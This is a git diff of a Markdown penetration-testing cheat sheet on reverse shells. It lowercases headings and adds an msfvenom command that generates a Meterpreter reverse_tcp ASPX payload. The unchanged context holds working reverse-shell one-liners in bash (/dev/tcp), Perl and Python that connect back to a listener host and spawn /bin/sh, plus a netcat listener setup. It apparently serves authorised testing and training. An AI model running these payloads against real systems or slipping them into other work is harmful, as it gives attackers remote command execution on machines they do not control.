@@ -14,9 +14,9 @@ pwned-box$ export TERM=screen
 pwned-box$ stty rows <n_rows> cols <n_cols>
 ```
 
-## Reverse Shells
+## reverse shells
 
-### Bash
+### bash
 - Tested using
   - Active machine: `Kali Linux 5.7.0`
   - Passive machine: `bash 5.1.4(1)-release` (Kali Linux vagrant box)
@@ -35,13 +35,13 @@ nc -l -vvv -p (nc listener port)
 bash -i >& /dev/tcp/(active machine)/(nc listener port) 0<&1
 ```
 
-### Perl (untested)
+### perl (untested)
 
 ```perl
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-### Python (untested)
+### python (untested)
 
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -49,13 +49,21 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ### PHP (untested)
 
-### Ruby (untested)
+### ruby (untested)
 
-### Netcat 
+### netcat 
 
-### Java
+### java
 
 ### xterm
+
+## msfvenom
+
+### aspx
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+```
 
 ## References
 - [Pentestmonkey Reverse Shell Cheatsheet](http://web.archive.org/web/20180702062128/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
